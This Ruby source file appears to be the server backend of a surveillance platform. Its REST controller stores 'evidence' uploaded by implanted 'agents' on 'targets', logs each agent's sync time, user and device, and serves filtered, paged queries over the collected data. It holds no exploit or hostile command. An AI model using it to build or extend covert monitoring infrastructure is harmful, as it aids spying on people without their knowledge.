#
# Controller for the Evidence objects
#

require_relative '../db_layer'
require_relative '../evidence_manager'
require_relative '../evidence_dispatcher'

# rcs-common
require 'rcs-common/symbolize'
require 'eventmachine'
require 'em-http-request'

# system
require 'time'
require 'json'

module RCS
module DB

class EvidenceController < RESTController

  # this must be a POST request
  # the instance is passed as parameter to the uri
  # the content is passed as body of the request
  def create
    require_auth_level :server, :tech

    ident = @params['_id'].slice(0..13)
    instance = @params['_id'].slice(15..-1)

    # save the evidence in the db
    begin
      id = RCS::DB::EvidenceManager.instance.store_evidence ident, instance, @request[:content]['content']
      # notify the worker
      RCS::DB::EvidenceDispatcher.instance.notify id, ident, instance
    rescue Exception => e
      trace :warn, "Cannot save evidence: #{e.message}"
      return not_found
    end

    trace :info, "Evidence saved. Dispatching evidence of [#{ident}::#{instance}][#{id}]"
    return ok({:bytes => @request[:content]['content'].size})
  end
  
  # used to report that the activity of an instance is starting
  def start
    require_auth_level :server, :tech
    
    # create a phony session
    session = @params.symbolize
    
    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found if agent.nil?
    
    # convert the string time to a time object to be passed to 'sync_start'
    time = Time.at(@params['sync_time']).getutc

    # update the stats
    agent.stat[:last_sync] = time
    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IN_PROGRESS
    agent.stat[:source] = @params['source']
    agent.stat[:user] = @params['user']
    agent.stat[:device] = @params['device']
    agent.save
    
    return ok
  end
  
  # used to report that the processing of an instance has finished
  def stop
    require_auth_level :server, :tech

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found if agent.nil?

    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_IDLE
    agent.save

    return ok
  end

  # used to report that the activity on an instance has timed out
  def timeout
    require_auth_level :server

    # create a phony session
    session = @params.symbolize

    # retrieve the agent from the db
    agent = Item.where({_id: session[:bid]}).first
    return not_found if agent.nil?

    agent.stat[:last_sync_status] = RCS::DB::EvidenceManager::SYNC_TIMEOUTED
    agent.save

    return ok
  end

  def index
    require_auth_level :view

    # filtering
    filter = {}
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'

    filter_hash = {}

    # filter by target
    target_id = filter['target']
    filter.delete('target')
    target = Item.where({_id: target_id}).first
    return not_found if target.nil?

    # filter by agent
    if filter['agent']
      agent_id = filter['agent']
      filter.delete('agent')
      agent = Item.where({_id: agent_id}).first
      return not_found if agent.nil?
      filter_hash[:item] = agent[:_id]
    end

    # date filters must be treated separately
    if filter.has_key? 'from' and filter.has_key? 'to'
      filter_hash[:acquired.gte] = filter.delete('from')
      filter_hash[:acquired.lte] = filter.delete('to')
    end

    mongoid_query do
      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id])
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      # paging
      if @params.has_key? 'startIndex' and @params.has_key? 'numItems'
        start_index = @params['startIndex'].to_i
        num_items = @params['numItems'].to_i
        #trace :debug, "Querying with filter #{filter_hash}."
        query = filtering.where(filter_hash).order_by([[:acquired, :asc]]).skip(start_index).limit(num_items)

        #trace :debug, query.inspect

      else
        # without paging, return everything
        query = filtering.where(filter_hash).order_by([[:acquired, :asc]])
      end

      return ok(query)
    end
  end

  def count
    require_auth_level :view

    # filtering
    filter = {}
    filter = JSON.parse(@params['filter']) if @params.has_key? 'filter'

    filter_hash = {}

    # filter by target
    target_id = filter['target']
    filter.delete('target')
    target = Item.where({_id: target_id}).first
    return not_found() if target.nil?

    # filter by agent
    if filter['agent']
      agent_id = filter['agent']
      filter.delete('agent')
      agent = Item.where({_id: agent_id}).first
      return not_found() if agent.nil?
      filter_hash[:item] = agent[:_id]
    end

    # date filters must be treated separately
    if filter.has_key? 'from' and filter.has_key? 'to'
      filter_hash[:acquired.gte] = filter.delete('from')
      filter_hash[:acquired.lte] = filter.delete('to')
    end

    mongoid_query do
      # copy remaining filtering criteria (if any)
      filtering = Evidence.collection_class(target[:_id])
      filter.each_key do |k|
        filtering = filtering.any_in(k.to_sym => filter[k])
      end

      num_evidence = filtering.where(filter_hash).count

      # Flex RPC does not accept 0 (zero) as return value for a pagination (-1 is a safe alternative)
      num_evidence = -1 if num_evidence == 0
      return ok(num_evidence)
    end
  end

end

end #DB::
end #RCS::